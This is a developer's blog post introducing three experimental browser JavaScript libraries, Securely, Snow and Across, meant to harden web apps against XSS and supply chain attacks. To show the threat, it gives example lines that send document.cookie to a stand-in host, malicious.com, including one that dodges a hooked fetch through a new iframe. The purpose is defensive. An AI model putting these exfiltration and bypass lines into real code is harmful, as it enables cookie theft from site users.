---
enabled: true
layout: post
tags: Security,JavaScript,Research,Published,Posts,News,Supply-Chain-Security
title: My contribution attempt to the browser javascript supply chain attack problem
url: https://weizman.github.io/
date: 18/07/2021
description: Introducing Securely, Snow and Across to help fight browser javascript supply chain attacks
keywords: browser, javascript, supply chain attack, security, xss, securely, snow, across
---

## Introducing Securely 🔒, Snow ❄️ and Across ↔

> *tl;dr - Today I share my "side project" for the past year, three browser javascript security libraries that aim to perform as
tools for creating web apps that are more resilient to and limiting of unwanted code execution such as XSS and javascript supply chain attacks:*

#### [Across ↔](https://github.com/lavamoat/across)

Across standard allows different scripts within the same web application to communicate with each other by passing messages between one another securely.

[🎬 Live Demo](https://lavamoat.github.io/across/demo/) | 
[📖 Technical explanation](https://github.com/lavamoat/across/wiki/Introducing-Across#across-technically-explained) | 
[⚙️ Installation and usage](https://github.com/lavamoat/across#install) | 
[👩🏽‍💻 Source Code](https://github.com/lavamoat/across) | 
[💪🏻 Motivation behind this project](https://github.com/lavamoat/across/wiki/Introducing-Across)

#### [Snow ❄️](https://github.com/lavamoat/snow)

Snow aspires to standardize how to recursively own newborn windows within a browser webpage, from the context of the webpage itself.

[🎬 Live Demo](https://lavamoat.github.io/snow/demo/) | 
[📖 Technical explanation](https://github.com/lavamoat/snow/wiki/Introducing-Snow#why-snow-solves-a-non-trivial-problem) | 
[⚙️ Installation and usage](https://github.com/lavamoat/snow#usage) | 
[👩🏽‍💻 Source Code](https://github.com/lavamoat/snow) | 
[💪🏻 Motivation behind this project](https://github.com/lavamoat/snow/wiki/Introducing-Snow)

#### [Securely 🔒](https://github.com/lavamoat/securely)

Securely allows you to call native APIs using their original behaviour even if they were tampered within the web app.

[🎬 Live Demo](https://lavamoat.github.io/securely/demo/) | 
[📖 Technical explanation](https://github.com/lavamoat/securely#securely-technically-explained-whats-the-s-suffix-for) | 
[⚙️ Installation and usage](https://github.com/lavamoat/securely#usage) | 
[👩🏽‍💻 Source Code](https://github.com/lavamoat/securely)

**`Across` is built on top of `Snow`. Both `Across` and `Snow` are built on top of `Securely`.**

**⚠️ These technologies are currently experimental!**

## The [Supply Chain Attacks](https://www.google.com/search?q=javascript+website+supply+chain+attack) Problem

In general, the ability to execute unwanted code within a website is still a major problem.
Doing so with XSS is less common these days, but with infection of the supply chain of web apps which is a rising issue, it's still very much possible.

To prevent such attacks, there are many different areas to defend. 
In my attempt, I focus on the real time prevention in the browser. 
Or in other words, what can attackers do once they successfully run within the website in the browser, and what I can do to make it harder for them?

### [Snow ❄️](https://github.com/lavamoat/snow)

> Snow intercepts every possible way of creating a new iframe, and grants you first access to its window, even before the creator of that iframe.
> In this [DEMO CTF](https://lavamoat.github.io/snow/demo/) I use Snow to disable access to `alert` API - think you can bypass Snow and pop an alert?

![Snow DEMO CTF](https://s4.gifyu.com/images/Screen-Recording-2022-08-07-at-17.39.25.gif)

Lack of full control over iFrames is a major enabler for successfully carrying supply chain attacks. 
To be more precise, let's get into the attackers shoes:

Assuming we already successfully breached the supply chain of a web app and we use our code execution to steal information and exfiltrate it
using `fetch` API:

```javascript
fetch('https://malicious.com/steal/cookies?data=' + document.cookie);
```

As a defender, I can hook `fetch` to block or at least log such attempt and by that potentially uncover such malicious activity in the website:

```javascript
const realFetch = window.fetch;
window.fetch = function(arg1, arg2, arg3) {
    console.log('fetch activity logged, might be an attacker', arg1, arg2, arg3);
    return realFetch.call(this, arg1, arg2, arg3);
};
```

There are already third party vendors that offer security services to websites against supply chain attacks by hooking sensitive
APIs in the website (just like attackers do) in order to track their usage and discover malicious activity.

The problem with that approach is `iframes`.

When creating a new `iframe`, a new `window` is attached to it, with all the usual APIs the top window exposes.
So if such a security vendor hooks `fetch` API to catch attackers, the attackers can easily avoid that hook by creating
a new iframe and pulling out of there a brand new `fetch` API:

```javascript
const ifr = document.createElement('iframe');
document.head.appendChild(ifr);
ifr.contentWindow.fetch.call(top, 'https://malicious.com/steal/cookies?data=' + document.cookie);
```

**By granting the defender the very first right of execution on every new iframe that 
comes to life within the web app, [Snow ❄️](https://github.com/lavamoat/snow) comes to solve exactly that.**

So if security vendors used to hook fetch as demonstrated above, with Snow you can now apply that code to every new iframe that comes to life within the app:

```javascript
const snow = require('@weizman/snow');
snow((win) => {
    const realFetch = win.fetch;
    win.fetch = function(arg1, arg2, arg3) {
        console.log('fetch activity logged, might be an attacker', arg1, arg2, arg3);
        return realFetch.call(this, arg1, arg2, arg3);
    };
});
```

Snow is a security driven project - it aspires to cover all techniques there are to creating new iframes, and it makes sure its
internal functionality is secure by calling sensitive operations via `Securely` (read below).

Snow aspires to set a new standart hermatic solution to nested ownership of windows in a webpage. Therefore, Snow is very useful
to a lot of other purposes, in and outside of the security field.

You can build in browser capabillities and tools and use Snow to eliminate the possibilites to bypass such tools by leavreging new realms.
Across is an excellent example to that.

> *To dive into Snow and learn more about this, its source code, how to install and use, how and why it works and designed*
> *the way it is and to see a live demonstration of how it works refer to the resources [listed above](#snow-%EF%B8%8F)*

### [Across ↔](https://github.com/lavamoat/across)

Across specifically is a new technology (also security related) that is a bit bigger than the supply chain attacks problem, but could not have been
created without leaning on Snow.

**In order to unlock the ability for two scripts within a webpage to communicate with each other securly based on their origin, [Across ↔](https://github.com/lavamoat/across) aspires to establish a way to do so**

In other words, with Across script `https://x.com/a.js` can share information with `https://y.com/b.js` and stay assured that this information:

* really did come from the sender script and not any other entity.
* was not tampered by any other entity.
* was not read by any other entity.

which is a state that cannot be achieved based on how modern browsers work.

To me, Across is a very exciting technology that unlocks possibilities that were non existing until now.

With Across third party scripts can safely exchange information with each other on the client side without needing a server.

Across can also be used to fight the supply chain attacks problem.
For example, Across can be used to set up a "proxy script" to sensitive APIs and grant access to those APIs only to specific scripts based on their origin.

This unlocks the ability to solve security problems, redefine business relations between different javascript vendors and more.

I dive into the possibilities Across unlocks in the [following section](https://github.com/lavamoat/across/wiki/Introducing-Across#unlocking-possibilities-with-across)

Across is also a security drived project that could not have been made without:
* Snow - to apply itself in all new windows in the webpage to remain secured;
* Securely - to eliminate the ability of an attacker to sabotage Across's core functionality by overriding APIs it uses.

> *To dive into Across and learn more about this, its source code, how to install and use, how and why it works and designed*
> *the way it is and to see a live demonstration of how it works refer to the resources [listed above](#across-)*

#### [Securely 🔒](https://github.com/lavamoat/securely)

Securely allows you to call native APIs using their original behaviour even if they were tampered within the web app.
This allows for writing tools such as Snow and Across that are more resilient to attacks such as prototype pollution and MITB.

Securely permits the web app and all js code that runs within it to apply such hooks out of belief that
these hooks are a legitimate and unseparatable part of the service provided by many third party vendors, especially in websites.

Instead, **Securely allows you to declare what native functionalities you might need to use in your web app** that you want to avoid any potential hooks
and **grants you exculsive access to them when needed**

> *To dive into Securely and learn more about this, its source code, how to install and use, how and why it works and designed*
> *the way it is and to see a live demonstration of how it works refer to the resources [listed above](#securely-)*

## My Take

As someone with vast experience in aspects of browser javascript security, including but not limited to supply chain defense, I wish
Securely, Snow and Across will be adopted and contributed to in order to get them ready for production usage.

I believe all three of them can be used to create more secure software that is less vulnerable to unwanted code that is executing within
a website in a browser, thanks to them handling exactly the security problems javascript allows as of today.

That being said, my approach is not the only one, I highly recommend learning about the complementary 
approach that [LavaMoat](https://github.com/lavamoat/lavamoat) brings.

I hope that with time we learn how to integrate and adopt all solutions as they are important together for creating a more secure
development platform for javascript web apps.

It is important to note - Securely, Snow and Across are tools for development, they are not standalone solutions.
In order for them to be effective one must use them as tools to fruther secure their web app.

## Feedback

I'd love to hear your feedback! Whether its help with the project, feedback on my approach and perception of the 
problem and the solution or anything else - it is highly appreciated.

Because eventually, these tools cannot take off without adoption.

I encourage you to read further about these technologies. Each one of them has its own README, WIKI and DEMO files that
aspire to explain and demonstrate these projects further as much as possible, in terms of motivation, technical explanation, demonstration and usage.

Hope this turns out helpful!
